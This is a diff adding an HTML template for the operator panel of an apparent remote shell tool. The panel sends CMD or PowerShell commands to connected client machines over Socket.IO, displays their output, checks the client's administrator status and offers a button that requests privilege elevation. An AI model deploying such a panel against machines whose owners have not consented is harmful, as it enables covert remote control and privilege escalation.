@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Remote Shell - {{ client_name }}</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.0/socket.io.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: 'Segoe UI', monospace;
+            background: #0a0b0e;
+            color: #e1e1e1;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0b0e 0%, #1a1b1f 100%);
+            z-index: -1;
+        }
+
+        .shell-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .client-info {
+            background: rgba(45, 45, 45, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .shell-output {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            height: 400px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+            white-space: pre-wrap;
+            font-family: 'Consolas', monospace;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .shell-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .command-input {
+            flex: 1;
+            padding: 12px;
+            background: rgba(45, 45, 45, 0.7);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-family: 'Consolas', monospace;
+        }
+
+        .button {
+            background: rgba(0, 102, 204, 0.8);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 102, 204, 0.3);
+        }
+
+        .button:hover {
+            background: rgba(0, 102, 204, 0.9);
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px rgba(0, 102, 204, 0.5);
+        }
+
+        .shell-type {
+            margin-bottom: 10px;
+        }
+
+        .shell-output span {
+            display: block;
+            word-wrap: break-word;
+        }
+
+        .stdout {
+            color: #4cd137;
+            text-shadow: 0 0 5px rgba(76, 209, 55, 0.3);
+        }
+
+        .stderr {
+            color: #ff6b6b;
+            text-shadow: 0 0 5px rgba(255, 107, 107, 0.3);
+        }
+
+        .error {
+            color: #ff4757;
+            text-shadow: 0 0 5px rgba(255, 71, 87, 0.3);
+        }
+
+        .system {
+            color: #70a1ff;
+            text-shadow: 0 0 5px rgba(112, 161, 255, 0.3);
+        }
+
+        .command {
+            color: #00a8ff;
+            text-shadow: 0 0 5px rgba(0, 168, 255, 0.3);
+            font-weight: bold;
+        }
+
+        .elevation-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .status-badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .elevation-btn {
+            background: rgba(255, 152, 0, 0.8);
+            box-shadow: 0 0 10px rgba(255, 152, 0, 0.3);
+            color: white;
+            padding: 5px 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .elevation-btn:hover {
+            background: rgba(255, 152, 0, 0.9);
+            box-shadow: 0 0 15px rgba(255, 152, 0, 0.5);
+        }
+
+        .admin {
+            color: #4CAF50;
+        }
+
+        .non-admin {
+            color: #f44336;
+        }
+
+        .disconnect-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 11, 14, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .disconnect-popup.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .disconnect-content {
+            background: rgba(25, 27, 35, 0.95);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            margin: auto;
+            transform: translateY(-20px);
+            transition: transform 0.3s ease;
+        }
+
+        .disconnect-popup.show .disconnect-content {
+            transform: translateY(0);
+        }
+
+        .disconnect-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #4CAF50;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="shell-container">
+        <div class="client-info">
+            <h2>Remote Shell - {{ client_name }}</h2>
+            <p>OS: {{ client_os }}</p>
+            <div class="elevation-status">
+                <span id="adminStatus" class="status-badge">⚪ Checking privileges...</span>
+                <button id="elevateBtn" onclick="requestElevation()" class="button elevation-btn" style="display: none;">
+                    🛡️ Run as Administrator
+                </button>
+            </div>
+        </div>
+        <div class="shell-type">
+            <label>
+                <input type="radio" name="shellType" value="cmd" checked> CMD
+            </label>
+            <label>
+                <input type="radio" name="shellType" value="powershell"> PowerShell
+            </label>
+            <label>
+                <input type="radio" name="shellType" value="cmd_session"> CMD Session
+            </label>
+            <label>
+                <input type="radio" name="shellType" value="powershell_session"> PowerShell Session
+            </label>
+        </div>
+        <div class="shell-output" id="output"></div>
+        <div class="shell-input">
+            <input type="text" id="command" class="command-input" 
+            placeholder="Enter command..." autocomplete="off" autocapitalize="off">
+            <button onclick="sendCommand()" class="button">Send</button>
+        </div>
+    </div>
+
+    <div id="disconnectPopup" class="disconnect-popup">
+        <div class="disconnect-content">
+            <div class="disconnect-icon">📡</div>
+            <h2>Connection Lost</h2>
+            <p>Attempting to reconnect to shell session...</p>
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        const clientId = "{{ client_id }}";
+        const output = document.getElementById('output');
+        const commandInput = document.getElementById('command');
+        const shellTypeInputs = document.getElementsByName('shellType');
+        let commandHistory = [];
+        let historyIndex = -1;
+        const adminStatus = document.getElementById('adminStatus');
+        const elevateBtn = document.getElementById('elevateBtn');
+        let isAdmin = false;
+
+        socket.on('connect', () => {
+            console.log('Connected to server');
+            hideDisconnectPopup();
+            appendOutput('Connected to server\n', 'stdout');
+            
+            // Join the shell room for this client
+            socket.emit('join_shell_room', { client_id: clientId });
+            
+            // Check admin status when connected
+            checkAdminStatus();
+        });
+
+        socket.on('shell_output', (data) => {
+            console.log('Received shell output:', data);
+            
+            // Add client disconnect detection
+            if (data.type === 'client_disconnect') {
+                showDisconnectPopup('Client disconnected. Waiting for reconnection...');
+                appendOutput('Client disconnected\n', 'error');
+                return;
+            }
+
+            if (data.type === 'client_reconnect') {
+                hideDisconnectPopup();
+                appendOutput('Client reconnected\n', 'stdout');
+                checkAdminStatus(); // Recheck admin status after reconnection
+                return;
+            }
+
+            if (data.type === 'admin_check') {
+                console.log('Admin check received:', data);  // Debug line
+                
+                // Make sure we have the isAdmin field
+                if ('isAdmin' in data) {
+                    const adminStatus = Boolean(data.isAdmin);  // Convert to boolean
+                    console.log('Parsed admin status:', adminStatus);  // Debug line
+                    updateAdminStatus(adminStatus);
+                } else {
+                    console.warn('Admin check missing isAdmin field:', data);
+                    // Try to infer from output as fallback
+                    const isAdmin = data.output === 'Administrator';
+                    updateAdminStatus(isAdmin);
+                }
+                
+                if (data.output) {
+                    appendOutput(`Admin Status: ${data.output}\n`, 'system');
+                }
+                return;
+            }
+            
+            if (data.output) {
+                let outputText = data.output;
+                let outputType = data.type || 'stdout';
+                
+                switch(outputType) {
+                    case 'stderr':
+                        outputText = '❌ ' + outputText;
+                        break;
+                    case 'error':
+                        outputText = '⚠️ ' + outputText;
+                        break;
+                    case 'system':
+                        outputText = '🔧 ' + outputText;
+                        break;
+                }
+                
+                appendOutput(outputText + '\n', outputType);
+            }
+        });
+
+        function getShellType() {
+            return Array.from(shellTypeInputs).find(input => input.checked).value;
+        }
+
+        function appendOutput(text, type) {
+            console.log('Appending output:', { text, type });  // Debug line
+            
+            const span = document.createElement('span');
+            span.textContent = text;
+            span.className = type;
+            output.appendChild(span);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function sendCommand() {
+            const command = commandInput.value.trim();
+            if (!command) return;
+
+            console.log('Sending command:', command);
+
+            // Add to history
+            commandHistory.unshift(command);
+            historyIndex = -1;
+            if (commandHistory.length > 50) {
+                commandHistory.pop();
+            }
+
+            // Show command in output
+            appendOutput(`${getShellType()}> ${command}\n`, 'command');
+
+            // Send command to server with session flag
+            const shellType = getShellType();
+            socket.emit('shell_command', {
+                unique_id: clientId,
+                command: command,
+                shell_type: shellType,
+                is_session: shellType.includes('session')
+            });
+
+            commandInput.value = '';
+        }
+
+        commandInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                sendCommand();
+            }
+        });
+
+        commandInput.addEventListener('keydown', (e) => {
+            switch(e.key) {
+                case 'ArrowUp':
+                    e.preventDefault();
+                    if (historyIndex < commandHistory.length - 1) {
+                        historyIndex++;
+                        commandInput.value = commandHistory[historyIndex];
+                    }
+                    break;
+                case 'ArrowDown':
+                    e.preventDefault();
+                    if (historyIndex > -1) {
+                        historyIndex--;
+                        commandInput.value = historyIndex >= 0 ? 
+                            commandHistory[historyIndex] : '';
+                    }
+                    break;
+            }
+        });
+
+        // Clean up on window close
+        window.addEventListener('beforeunload', () => {
+            socket.disconnect();
+        });
+
+        function checkAdminStatus() {
+            console.log('Requesting admin status check...');  // Debug line
+            socket.emit('shell_command', {
+                unique_id: clientId,
+                command: 'check_admin',
+                shell_type: getShellType()
+            });
+        }
+
+        function requestElevation() {
+            if (!isAdmin) {
+                socket.emit('shell_command', {
+                    unique_id: clientId,
+                    command: 'elevate',
+                    shell_type: getShellType()
+                });
+                appendOutput('Requesting administrator privileges...\n', 'system');
+            }
+        }
+
+        function updateAdminStatus(isAdminStatus) {
+            console.log('Updating admin status to:', isAdminStatus); // Debug log
+            isAdmin = isAdminStatus;
+            const adminStatusElement = document.getElementById('adminStatus');
+            const elevateBtn = document.getElementById('elevateBtn');
+            
+            if (adminStatusElement) {
+                if (isAdmin) {
+                    adminStatusElement.textContent = '🛡️ Administrator';
+                    adminStatusElement.className = 'status-badge admin';
+                } else {
+                    adminStatusElement.textContent = '👤 Standard User';
+                    adminStatusElement.className = 'status-badge non-admin';
+                }
+            }
+            
+            if (elevateBtn) {
+                elevateBtn.style.display = isAdmin ? 'none' : 'inline-block';
+            }
+        }
+
+        socket.on('disconnect', () => {
+            console.log('Disconnected from server');
+            showDisconnectPopup();
+            appendOutput('Disconnected from server\n', 'error');
+        });
+
+        function showDisconnectPopup(message = 'Attempting to reconnect to shell session...') {
+            const popup = document.getElementById('disconnectPopup');
+            const messageElement = popup.querySelector('p');
+            if (messageElement) {
+                messageElement.textContent = message;
+            }
+            popup.classList.add('show');
+        }
+
+        function hideDisconnectPopup() {
+            const popup = document.getElementById('disconnectPopup');
+            popup.classList.remove('show');
+        }
+    </script>
+</body>
+</html> 
